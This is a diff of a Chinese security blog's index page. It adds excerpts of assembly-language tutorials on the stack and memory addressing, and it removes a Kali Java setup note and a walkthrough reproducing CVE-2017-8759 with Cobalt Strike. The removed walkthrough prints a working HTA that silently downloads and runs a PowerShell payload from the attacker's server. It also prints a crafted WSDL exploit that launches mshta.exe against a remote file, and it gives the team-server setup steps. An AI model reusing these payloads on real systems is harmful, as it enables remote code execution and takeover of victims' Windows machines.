@@ -197,6 +197,248 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+      <meta itemprop="description" content="m0nst3r喜欢Web安全、渗透测试、网络安全、代码审计、逆向、编程，欢迎各位大表哥莅临指导。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89.html" class="post-title-link" itemprop="url">逆向工程——汇编基础（四）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-20 11:12:00" itemprop="dateCreated datePublished" datetime="2017-11-20T11:12:00+08:00">2017-11-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-06-03 18:46:42" itemprop="dateModified" datetime="2020-06-03T18:46:42+08:00">2020-06-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89.html" class="post-meta-item leancloud_visitors" data-flag-title="逆向工程——汇编基础（四）" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89.html#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="re/逆向工程——汇编基础（四）.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>[TOC]</p>
+<h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol>
+<li><p>堆栈是一个先进后出（FILO）的线性表<br><code>FILO</code>是指：<code>最后</code>放进表中的数据在<code>取出</code>时，<code>最先</code>出来，即 Fist in Last Out。<br><img src="/images/60108094ba47d6ce8998f695549e24556fa9b08f.png" alt="3rd_1.png"></p>
+</li>
+<li><p>系统堆栈不仅仅是一段内存。<br>由于CPU对它实施管理，因此你不需要考虑堆栈指针的修正问题。可以把寄存器内容，甚至一个立即数直接放入堆栈里，并在需要的时候将其取出。同时，系统并不要求取出的数据任然回到原来的位置。</p>
+</li>
+</ol>
+<h3 id="堆栈相关指令"><a href="#堆栈相关指令" class="headerlink" title="堆栈相关指令"></a>堆栈相关指令</h3><p>除了显示地操作堆栈（使用<code>push</code>和<code>pop</code>指令）之外，很多指令也需要使用堆栈，如<code>INT</code>、<code>CALL</code>、<code>LEAVE</code>、<code>RET</code>、<code>RETE</code>、<code>IRET</code>等等。配对使用上述指令并不会造成什么问题，然而，如果你打算使用LEAVE、RET、RETE、IRET这样的指令实现跳转（比JMP更为麻烦，然而有时，例如在加密软件中，或者需要修改调用者状态时这是必要的）的话，那么要搞清楚他们做的到底是什么，并且精确而了解自己要做什么。</p>
+<h4 id="push-pop指令"><a href="#push-pop指令" class="headerlink" title="push/pop指令"></a>push/pop指令</h4><p><code>push 寄存器</code>：将一个寄存器中的数据<code>压入</code>堆栈；<br><code>pop 寄存器</code>：将<code>栈顶</code>的数据<code>弹出</code>堆栈，并传入指定的寄存器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ax			;将ax中的数据入栈</span><br><span class="line">pop ax			;将堆栈栈顶的数据弹出并传送给ax</span><br></pre></td></tr></table></figure>
+<p><code>push 段寄存器</code>：将一个段寄存器中的数据压入堆栈；<br><code>pop 段寄存器</code>：将栈顶表示的数据弹出，并传入端寄存器。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+      <meta itemprop="description" content="m0nst3r喜欢Web安全、渗透测试、网络安全、代码审计、逆向、编程，欢迎各位大表哥莅临指导。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89.html" class="post-title-link" itemprop="url">逆向工程——汇编基础（三）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-15 11:12:00" itemprop="dateCreated datePublished" datetime="2017-11-15T11:12:00+08:00">2017-11-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-06-03 18:46:42" itemprop="dateModified" datetime="2020-06-03T18:46:42+08:00">2020-06-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89.html" class="post-meta-item leancloud_visitors" data-flag-title="逆向工程——汇编基础（三）" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89.html#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="re/逆向工程——汇编基础（三）.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>[TOC]</p>
+<p>参考文档：《简明 x86 汇编语言教程》作者：司徒彦南<br>##操作内存<br>我们可以将内存想象为一个顺序的字节流。操作内存是，首先需要的就是他的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[0]</span><br></pre></td></tr></table></figure>
+<p><code>方括号</code>表示，里面的表达式指定的不是<code>立即数</code>，而是<code>偏移量</code>。在是模式中，<code>DS:0</code>中的那个<code>字</code>会被装入AX。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov [0],ax</span><br></pre></td></tr></table></figure>
+<p>mov指令也可以把数据保存到内存中。<br>###描述内存宽度的操作符</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作符</th>
+<th align="left">意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">byte ptr</td>
+<td align="left">一个字节（8-bit，1 byte）</td>
+</tr>
+<tr>
+<td align="left">word ptr</td>
+<td align="left">一个字（16-bit）</td>
+</tr>
+<tr>
+<td align="left">dword ptr</td>
+<td align="left">一个双字（32-bit）</td>
+</tr>
+</tbody></table>
+<p>例如，在DS:100h处保存1234h，以字存放：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr [100h],01234h</span><br></pre></td></tr></table></figure>
+<p>于是，我们将mov指令扩展为：</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1141,256 +1383,6 @@ mysql> select if(1<0,sleep(5),sleep(2)); 0 1 +---------------------------+ | if(
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/blaa/Kali%20%E9%85%8D%E7%BD%AEJava%201.7.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="m0nst3r">
-      <meta itemprop="description" content="m0nst3r喜欢Web安全、渗透测试、网络安全、代码审计、逆向、编程，欢迎各位大表哥莅临指导。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="m0nst3r's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blaa/Kali%20%E9%85%8D%E7%BD%AEJava%201.7.html" class="post-title-link" itemprop="url">Kali 配置Java 1.7</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2017-10-14 11:12:00" itemprop="dateCreated datePublished" datetime="2017-10-14T11:12:00+08:00">2017-10-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-06-03 18:46:42" itemprop="dateModified" datetime="2020-06-03T18:46:42+08:00">2020-06-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/blaa/" itemprop="url" rel="index"><span itemprop="name">blaa</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/blaa/Kali%20%E9%85%8D%E7%BD%AEJava%201.7.html" class="post-meta-item leancloud_visitors" data-flag-title="Kali 配置Java 1.7" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/blaa/Kali%20%E9%85%8D%E7%BD%AEJava%201.7.html#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="blaa/Kali 配置Java 1.7.html" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>[TOC]<br>##需求<br>Cobalt strike 用openjdk的话，不稳定，而且运行时候提示openjdk不推荐。</p>
-<p>##更新步骤</p>
-<ol>
-<li><p>下载JDK1.7,这个版本是比较稳定的，对于cobalt strike来说。下载地址我找到过一次，后来在也找不到了，不知道为啥。JDK1.7百度网盘地址下载在后面。</p>
-</li>
-<li><p>将下载的jdk1.7解压缩。</p>
-</li>
-<li><p>在<code>/usr/lib/jvm</code>下新建<code>jdk17</code>，将解压出来的目录移动到该目录下。</p>
-</li>
-<li><p>运行以下三条命令，安装JDK1.7：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;java java &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk17&#x2F;bin&#x2F;java 1</span><br><span class="line">update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;javac javac &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk17&#x2F;bin&#x2F;javac 1</span><br><span class="line">update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;jar jar &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk17&#x2F;bin&#x2F;jar 1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置JDK1.7为默认java：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br><span class="line">There are 2 choices for the alternative java (providing &#x2F;usr&#x2F;bin&#x2F;java).</span><br><span class="line"></span><br><span class="line">  Selection    Path                                            Priority   Status</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">* 0            &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64&#x2F;jre&#x2F;bin&#x2F;java   1081      auto mode</span><br><span class="line">  1            &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64&#x2F;jre&#x2F;bin&#x2F;java   1081      manual mode</span><br><span class="line">  2            &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk17&#x2F;bin&#x2F;java                      1         manual mode</span><br></pre></td></tr></table></figure>
-<p> 选择<code>2</code>。完成。</p>
-</li>
-</ol>
-<p>##截图<br><img src="/images/96e085a2caa5e97c26663bb0e40147d948d162ee.png" alt="jdk2.png"></p>
-<p><img src="/images/6dd796eb36b2da20640f15e5a365aee4b36a26d3.png" alt="jdk.png"></p>
-<p>##JDK1.7下载<br><a href="https://pan.baidu.com/s/1jHHOxtO" target="_blank" rel="noopener" title="JDK7">JDK7 百度网盘</a></p>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/blaa/Kali%20%E9%85%8D%E7%BD%AEJava%201.7.html#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/pentest/CVE-2017-8759%20+%20Cobalt%20Strike%20%E5%AE%8C%E7%BE%8E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="m0nst3r">
-      <meta itemprop="description" content="m0nst3r喜欢Web安全、渗透测试、网络安全、代码审计、逆向、编程，欢迎各位大表哥莅临指导。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="m0nst3r's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/pentest/CVE-2017-8759%20+%20Cobalt%20Strike%20%E5%AE%8C%E7%BE%8E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0.html" class="post-title-link" itemprop="url">CVE-2017-8759 + Cobalt Strike 完美复现过程笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2017-09-27 11:12:00" itemprop="dateCreated datePublished" datetime="2017-09-27T11:12:00+08:00">2017-09-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-06-03 18:46:42" itemprop="dateModified" datetime="2020-06-03T18:46:42+08:00">2020-06-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/pentest/CVE-2017-8759%20+%20Cobalt%20Strike%20%E5%AE%8C%E7%BE%8E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0.html" class="post-meta-item leancloud_visitors" data-flag-title="CVE-2017-8759 + Cobalt Strike 完美复现过程笔记" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/pentest/CVE-2017-8759%20+%20Cobalt%20Strike%20%E5%AE%8C%E7%BE%8E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0.html#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="pentest/CVE-2017-8759 + Cobalt Strike 完美复现过程笔记.html" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>[TOC]</p>
-<blockquote>
-<p>主要参考文章是来自<code>Lz1y</code> 大神的文章：<a href="http://www.lz1y.cn/wordpress/?p=799" target="_blank" rel="noopener">http://www.lz1y.cn/wordpress/?p=799</a></p>
-</blockquote>
-<p>更新记录：</p>
-<blockquote>
-<p>最新修改与：2017年9月28日</p>
-</blockquote>
-<p>##工具</p>
-<ol>
-<li><a href="https://github.com/Lz1y/CVE-2017-8759.git" target="_blank" rel="noopener">https://github.com/Lz1y/CVE-2017-8759.git</a></li>
-<li>Cobalt Strike（请自行下载）</li>
-</ol>
-<p>##步骤</p>
-<ol>
-<li>在kali上面，执行命令<br><code>git clone https://github.com/Lz1y/CVE-2017-8759.git</code></li>
-<li>进入cobalt strike目录，执行:<br><code>./teamserver 192.168.1.9 123456</code></li>
-<li>在cobalt strike目录，执行<code>./cobaltstrike</code>运行cobalt strike客户端。</li>
-<li>在cobalt strike中新建<code>Listener</code>，类型用<code>http</code>的，端口输入<code>80</code>。</li>
-<li>进入该目录，依次修改以下文档：<br>5.1 <code>gedit cmd.jpg</code> (先<code>cp cmd.hta cmd.jpg</code>)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Sub window_onload</span><br><span class="line">    window.resizeTo 0,0</span><br><span class="line">    window.MoveTo -100,-100</span><br><span class="line">	const impersonation &#x3D; 3</span><br><span class="line">	Const HIDDEN_WINDOW &#x3D; 12</span><br><span class="line">	Set Locator &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">    Locator.Run&quot;powershell.exe -nop -w hidden -c &quot;&quot;IEX (new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.1.9:80&#x2F;a&#39;)&quot;&quot;&quot;,0,FALSE</span><br><span class="line">    window.close()</span><br><span class="line">end sub</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Sub window_onload</span><br><span class="line">	const impersonation &#x3D; 3</span><br><span class="line">	Const HIDDEN_WINDOW &#x3D; 12</span><br><span class="line">	Set Locator &#x3D; CreateObject(&quot;WbemScripting.SWbemLocator&quot;)</span><br><span class="line">	Set Service &#x3D; Locator.ConnectServer()</span><br><span class="line">	Service.Security_.ImpersonationLevel&#x3D;impersonation</span><br><span class="line">	Set objStartup &#x3D; Service.Get(&quot;Win32_ProcessStartup&quot;)</span><br><span class="line">	Set objConfig &#x3D; objStartup.SpawnInstance_</span><br><span class="line">	Set Process &#x3D; Service.Get(&quot;Win32_Process&quot;)</span><br><span class="line">	Error &#x3D; Process.Create(&quot;powershell.exe -nop -w hidden calc.exe&quot;, null, objConfig, intProcessID)</span><br><span class="line">	window.close()</span><br><span class="line">end sub</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<img src="/images/6159be0672af87636a5ba845eb097b115a8a5f54.png" alt="微信截图_20170927155342.png"></li>
-<li>2 <code>gedit exploit.txt</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">﻿&lt;definitions</span><br><span class="line">    xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;wsdl&#x2F;&quot;</span><br><span class="line">    xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;wsdl&#x2F;soap&#x2F;&quot;</span><br><span class="line">    xmlns:suds&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;wsdl&#x2F;suds&quot;</span><br><span class="line">    xmlns:tns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;clr&#x2F;ns&#x2F;System&quot;</span><br><span class="line">    xmlns:ns0&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;clr&#x2F;nsassem&#x2F;Logo&#x2F;Logo&quot;&gt;</span><br><span class="line">    &lt;portType name&#x3D;&quot;PortType&quot;&#x2F;&gt;</span><br><span class="line">    &lt;binding name&#x3D;&quot;Binding&quot; type&#x3D;&quot;tns:PortType&quot;&gt;</span><br><span class="line">        &lt;soap:binding style&#x3D;&quot;rpc&quot; transport&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;http&quot;&#x2F;&gt;</span><br><span class="line">        &lt;suds:class type&#x3D;&quot;ns0:Image&quot; rootType&#x3D;&quot;MarshalByRefObject&quot;&gt;&lt;&#x2F;suds:class&gt;</span><br><span class="line">    &lt;&#x2F;binding&gt;</span><br><span class="line">    &lt;service name&#x3D;&quot;Service&quot;&gt;</span><br><span class="line">        &lt;port name&#x3D;&quot;Port&quot; binding&#x3D;&quot;tns:Binding&quot;&gt;</span><br><span class="line">            &lt;soap:address location&#x3D;&quot;http:&#x2F;&#x2F;192.168.1.9?C:\Windows\System32\mshta.exe?http:&#x2F;&#x2F;192.168.1.9&#x2F;cmd.jpg&quot;&#x2F;&gt;</span><br><span class="line">                        &lt;soap:address location&#x3D;&quot;;</span><br><span class="line">                        if (System.AppDomain.CurrentDomain.GetData(_url.Split(&#39;?&#39;)[0]) &#x3D;&#x3D; null) &#123;</span><br><span class="line">                                System.Diagnostics.Process.Start(_url.Split(&#39;?&#39;)[1], _url.Split(&#39;?&#39;)[2]);</span><br><span class="line">                                System.AppDomain.CurrentDomain.SetData(_url.Split(&#39;?&#39;)[0], true);</span><br><span class="line">                        &#125; &#x2F;&#x2F;&quot;&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;port&gt;</span><br><span class="line">    &lt;&#x2F;service&gt;</span><br><span class="line">&lt;&#x2F;definitions&gt;</span><br></pre></td></tr></table></figure>
-<img src="/images/0f4ad09fcc7f849df9d41ba28b009cd8c47f6d11.png" alt="微信截图_20170927155425.png"><br>​    以上两个文档的修改要与cobalt strike相对应</li>
